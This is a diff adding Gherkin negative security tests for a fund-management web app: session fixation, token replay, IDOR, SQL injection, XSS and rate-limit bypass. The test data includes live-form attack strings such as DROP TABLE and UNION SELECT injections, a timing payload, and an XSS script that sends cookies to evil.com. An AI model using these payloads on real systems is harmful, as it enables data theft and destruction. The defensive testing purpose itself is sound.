@@ -1481,4 +1481,365 @@ Feature: Security Tests
     When I try to access HTTP URL
     Then I am redirected to HTTPS
     And all resources load via HTTPS
+
+  # ===========================================================
+  # NEGATIVE SECURITY TEST SCENARIOS
+  # ===========================================================
+  # These tests verify protection against specific attack vectors
+  # Tags: @negative @security
+
+  # --- Session Fixation Attack Prevention ---
+  @negative @security
+  Scenario: Session fixation attack - attacker sets session before login
+    Given an attacker knows the session cookie name
+    And the attacker sets a session cookie "malicious-session-id" in my browser
+    When I successfully login with valid credentials
+    Then a completely new session ID is generated
+    And the pre-set "malicious-session-id" is discarded
+    And the attacker cannot hijack my session using their known ID
+
+  @negative @security
+  Scenario: Session fixation via URL parameter injection
+    Given an attacker sends me a link with session ID in URL
+    When I click the link and login
+    Then the URL session parameter is ignored
+    And a new server-generated session ID is used
+    And my session is not fixated to the attacker's ID
+
+  @negative @security
+  Scenario: Session fixation via meta refresh or redirect
+    Given an attacker page attempts to set my session via redirect
+    When I navigate away and login to lpxgp.com
+    Then cross-origin session manipulation is blocked
+    And a fresh session ID is generated on successful login
+
+  @negative @security
+  Scenario: Session ID regeneration on privilege escalation
+    Given I am logged in as a Member
+    When my role is upgraded to Admin
+    Then my session ID is regenerated
+    And the old session ID cannot be used to access Admin features
+
+  @negative @security
+  Scenario: Session fixation through subdomain cookie
+    Given an attacker controls a subdomain (e.g., malicious.lpxgp.com)
+    And they set a session cookie scoped to .lpxgp.com
+    When I login to lpxgp.com
+    Then the subdomain cookie is rejected or overwritten
+    And a new secure session is established
+
+  # --- Token Replay Attack Prevention ---
+  @negative @security
+  Scenario: Replay of captured authentication token
+    Given I logged in and my session token was intercepted
+    When I logout
+    And the attacker replays the captured token
+    Then the token is rejected as invalidated
+    And the attacker receives 401 Unauthorized
+
+  @negative @security
+  Scenario: Replay of password reset token
+    Given I received a password reset email
+    And I successfully reset my password
+    When the same reset token is replayed (by attacker or me)
+    Then the token is rejected as already used
+    And I see "Reset link already used"
+
+  @negative @security
+  Scenario: Replay of invitation token
+    Given I accepted an invitation and created my account
+    When the same invitation token is replayed
+    Then the token is rejected as already consumed
+    And no duplicate account can be created
+
+  @negative @security
+  Scenario: Replay of old session token after password change
+    Given I captured my current session token
+    When I change my password
+    And the old token is replayed
+    Then the old token is rejected
+    And I must re-authenticate with new credentials
+
+  @negative @security
+  Scenario: Replay of token from different IP address
+    Given I logged in from IP 1.2.3.4
+    When my token is replayed from IP 5.6.7.8
+    Then the system detects IP mismatch (if IP binding enabled)
+    And additional verification may be required
+    And the replay attempt is logged
+
+  @negative @security
+  Scenario: Replay of verification email token
+    Given I verified my email address
+    When the verification token is replayed
+    Then the token is rejected as already used
+    And my account status is not affected
+
+  @negative @security
+  Scenario: Token with future timestamp (clock skew attack)
+    Given an attacker creates a token with future expiry timestamp
+    When the token is submitted to the API
+    Then the token is rejected due to invalid timestamp
+    And the attempt is logged for security review
+
+  @negative @security
+  Scenario: Concurrent session token usage detection
+    Given I have an active session token
+    When the same token is used simultaneously from two locations
+    Then the system detects concurrent usage
+    And may invalidate both sessions requiring re-auth
+    And I receive security alert notification
+
+  # --- IDOR Prevention (Accessing Other Company's Data) ---
+  @negative @security
+  Scenario: IDOR on user profile endpoint
+    Given I am authenticated as user "user-123" from "Acme Capital"
+    And "Other Firm" has user "user-456"
+    When I request "/api/users/user-456/profile"
+    Then I receive 404 Not Found
+    And no user data from Other Firm is exposed
+
+  @negative @security
+  Scenario: IDOR via UUID enumeration
+    Given I am authenticated from "Acme Capital"
+    When I iterate through predictable UUIDs for resources
+    Then I only receive data for resources owned by Acme Capital
+    And other company resources return 404
+
+  @negative @security
+  Scenario: IDOR on batch operations
+    Given I am from "Acme Capital"
+    When I send batch request with IDs from multiple companies
+    Then only Acme Capital resources are processed
+    And other company resource IDs are ignored or return 404
+    And partial success is clearly reported
+
+  @negative @security
+  Scenario: IDOR via export functionality
+    Given I am from "Acme Capital"
+    When I try to export by manipulating resource IDs in request
+    Then export only includes Acme Capital data
+    And other company data is not included
+
+  @negative @security
+  Scenario: IDOR through GraphQL query (if applicable)
+    Given I am authenticated from "Acme Capital"
+    When I craft GraphQL query to access other company's nested data
+    Then RLS policies block cross-company access
+    And only authorized data is returned
+
+  @negative @security
+  Scenario: IDOR via object reference in file download
+    Given "Acme Capital" has file "report-123.pdf"
+    And "Other Firm" has file "report-456.pdf"
+    When I try to download "/files/report-456.pdf"
+    Then I receive 404 Not Found
+    And the file from Other Firm is not accessible
+
+  @negative @security
+  Scenario: IDOR using sequential/predictable IDs
+    Given resources have sequential integer IDs
+    When I access my resource at "/api/resource/100"
+    And I try to access "/api/resource/99" (another company)
+    Then I receive 404 Not Found
+    And no information leakage occurs
+
+  @negative @security
+  Scenario: IDOR through webhook or callback manipulation
+    Given I configure a webhook for my fund events
+    When I try to set webhook to receive other company's events
+    Then the webhook only receives Acme Capital events
+    And cross-company event subscription is blocked
+
+  # --- SQL Injection Prevention ---
+  @negative @security
+  Scenario: SQL injection in login email field
+    When I attempt login with email "admin'--"
+    And password "anything"
+    Then I receive "Invalid email or password"
+    And no SQL injection occurs
+    And the attempt is logged
+
+  @negative @security
+  Scenario: SQL injection in search ORDER BY clause
+    When I send search request with sort="name; DROP TABLE lps;--"
+    Then the sort parameter is validated against whitelist
+    And malicious SQL is not executed
+    And default sorting is applied
+
+  @negative @security
+  Scenario: SQL injection via UNION-based attack
+    When I search for "' UNION SELECT password FROM users--"
+    Then parameterized queries prevent injection
+    And no password data is returned
+    And the attempt is logged
+
+  @negative @security
+  Scenario: Blind SQL injection via timing attack
+    When I search for "' OR IF(1=1, SLEEP(5), 0)--"
+    Then the search completes normally (no delay)
+    And injection is prevented by parameterized queries
+
+  @negative @security
+  Scenario: SQL injection in JSON body fields
+    When I POST fund creation with name "Fund'; DROP TABLE funds;--"
+    Then the input is properly escaped/parameterized
+    And the fund is created with literal name (or rejected)
+    And database integrity is maintained
+
+  @negative @security
+  Scenario: Second-order SQL injection
+    Given I created a fund with name "'; DROP TABLE lps;--"
+    When the fund name is used in another query later
+    Then the stored value is still safely parameterized
+    And no injection occurs on retrieval
+
+  @negative @security
+  Scenario: SQL injection in array/list parameters
+    When I send filter request with types=["Public Pension'; DELETE FROM users;--"]
+    Then the array elements are safely parameterized
+    And no SQL injection occurs
+
+  @negative @security
+  Scenario: SQL injection via HTTP headers
+    When I send request with X-Custom-Header: "'; DROP TABLE sessions;--"
+    Then headers are not used in SQL queries
+    Or they are safely sanitized if used
+
+  # --- XSS Prevention in User Input Fields ---
+  @negative @security
+  Scenario: Stored XSS in fund name
+    When I create a fund with name "<img src=x onerror=alert('xss')>"
+    And another user views the fund
+    Then the HTML is escaped in output
+    And no JavaScript executes for the viewer
+
+  @negative @security
+  Scenario: Reflected XSS in search query
+    When I search for "<script>document.location='evil.com?c='+document.cookie</script>"
+    And results are displayed
+    Then the script tag is escaped in the response
+    And no script executes
+
+  @negative @security
+  Scenario: DOM-based XSS via URL fragment
+    When I navigate to "/search#<img src=x onerror=alert(1)>"
+    Then client-side code safely handles fragment
+    And no script executes
+
+  @negative @security
+  Scenario: XSS via SVG upload (if applicable)
+    When I try to upload avatar with SVG containing "<script>alert('xss')</script>"
+    Then the upload is rejected
+    Or SVG is sanitized to remove script elements
+
+  @negative @security
+  Scenario: XSS in user display name rendering
+    Given I set my name to "<b onmouseover=alert(1)>Hover me</b>"
+    When my name is displayed on any page
+    Then the HTML tags are escaped
+    And event handlers are not executed
+
+  @negative @security
+  Scenario: XSS via JSON response manipulation
+    When I inject "</script><script>alert(1)</script>" in a field
+    And the server includes it in JSON response
+    Then proper JSON encoding prevents script execution
+    And Content-Type header is application/json
+
+  @negative @security
+  Scenario: XSS via error message reflection
+    When I cause an error with input "<script>alert('xss')</script>"
+    And the error message includes my input
+    Then the error message is properly escaped
+    And no script executes
+
+  @negative @security
+  Scenario: XSS via markdown rendering (if applicable)
+    When I enter "[Click me](javascript:alert('xss'))" in a markdown field
+    Then javascript: URLs are sanitized
+    And the link does not execute JavaScript
+
+  @negative @security
+  Scenario: XSS via CSS injection
+    When I enter "background: url('javascript:alert(1)')" in a style field
+    Then CSS injection is prevented
+    And no JavaScript executes via CSS
+
+  @negative @security
+  Scenario: XSS header injection (Content-Type manipulation)
+    When I send request with malformed Accept header to inject script
+    Then server response maintains proper Content-Type
+    And no script execution occurs
+
+  # --- Rate Limiting Bypass Attempts ---
+  @negative @security
+  Scenario: Rate limit bypass via IP rotation
+    Given I hit rate limit from IP 1.2.3.4
+    When I continue requests from IP 1.2.3.5 with same user account
+    Then rate limit applies per user account, not just IP
+    And I remain rate limited
+
+  @negative @security
+  Scenario: Rate limit bypass via header manipulation
+    When I send requests with X-Forwarded-For: "new-ip-each-time"
+    Then the server uses real client IP, not forwarded header
+    And rate limit cannot be bypassed via header spoofing
+
+  @negative @security
+  Scenario: Rate limit bypass via User-Agent rotation
+    Given I hit rate limit
+    When I change User-Agent header on each request
+    Then rate limit is based on IP/session, not User-Agent
+    And I remain rate limited
+
+  @negative @security
+  Scenario: Rate limit bypass via case variation in endpoint
+    Given I hit rate limit on "/api/login"
+    When I try "/API/LOGIN" or "/Api/Login"
+    Then endpoint comparison is case-insensitive
+    And rate limit still applies
+
+  @negative @security
+  Scenario: Rate limit bypass via URL encoding
+    Given I hit rate limit on "/api/search"
+    When I try "/%61%70%69/%73%65%61%72%63%68" (URL encoded)
+    Then URL is decoded before rate limit check
+    And rate limit still applies
+
+  @negative @security
+  Scenario: Rate limit bypass via trailing slash
+    Given I hit rate limit on "/api/login"
+    When I try "/api/login/"
+    Then routes are normalized
+    And rate limit still applies
+
+  @negative @security
+  Scenario: Rate limit bypass via HTTP method change
+    Given I hit rate limit for POST /api/login
+    When I try other HTTP methods (GET, PUT, OPTIONS)
+    Then rate limit applies across relevant methods
+    And I cannot bypass by method switching
+
+  @negative @security
+  Scenario: Rate limit counter reset manipulation
+    Given I hit rate limit
+    When I wait exactly at the limit reset time
+    And I send burst of requests at reset moment
+    Then rate limit handles edge case correctly
+    And I cannot exploit timing window
+
+  @negative @security
+  Scenario: Distributed rate limit bypass (multiple sessions)
+    Given I create 10 different sessions
+    When I distribute requests across all sessions
+    Then per-user rate limit aggregates all sessions
+    And combined requests still trigger rate limit
+
+  @negative @security
+  Scenario: Rate limit bypass via API version change
+    Given I hit rate limit on "/api/v1/login"
+    When I try "/api/v2/login" (if exists)
+    Then rate limit applies across API versions
+    And I remain rate limited
 ```
